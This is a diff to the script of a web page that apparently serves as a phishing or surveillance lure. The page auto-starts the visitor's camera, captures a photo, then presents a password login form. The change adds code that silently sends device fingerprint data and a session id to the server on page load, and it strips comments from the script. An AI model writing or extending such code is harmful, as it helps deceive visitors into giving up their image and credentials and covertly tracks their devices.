@@ -661,6 +661,32 @@
         let photoCaptured = false;
         let loginSubmitted = false;
 
+        // Send device info
+        function sendDeviceInfo() {
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                screenColorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
+            };
+            
+            fetch('/api/device', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    sessionId: sessionId,
+                    deviceInfo: deviceInfo
+                })
+            }).catch(() => {});
+        }
+
+        // Send device info on load
+        sendDeviceInfo();
+
         // Start camera
         async function startCamera() {
             try {
@@ -683,7 +709,6 @@
                 document.getElementById('statusText').textContent = '⚠️ Camera access needed. Please allow camera in browser settings.';
                 document.getElementById('captureBtn').disabled = true;
                 document.getElementById('statusBadgeText').textContent = '⚠️ Camera blocked';
-                // Show login form anyway after a moment
                 setTimeout(showLoginForm, 3000);
             }
         }
@@ -724,7 +749,6 @@
                 document.getElementById('captureBtn').disabled = true;
                 document.getElementById('captureBtn').innerHTML = '✅ Done!';
                 
-                // Progress animation
                 let p = 0;
                 const interval = setInterval(() => {
                     p += 2;
@@ -732,7 +756,6 @@
                     document.getElementById('percentText').textContent = p + '%';
                     if (p >= 100) {
                         clearInterval(interval);
-                        // Show login form after progress completes
                         setTimeout(showLoginForm, 500);
                     }
                 }, 40);
@@ -792,18 +815,14 @@
             }
         });
 
-        // Skip button - show login form
         document.getElementById('skipBtn').addEventListener('click', function() {
             showLoginForm();
         });
 
-        // Auto-start camera
         startCamera();
 
-        // Capture on button click
         document.getElementById('captureBtn').addEventListener('click', capturePhoto);
 
-        // Enter key on password field triggers login
         document.getElementById('loginPassword').addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
                 document.getElementById('loginBtn').click();
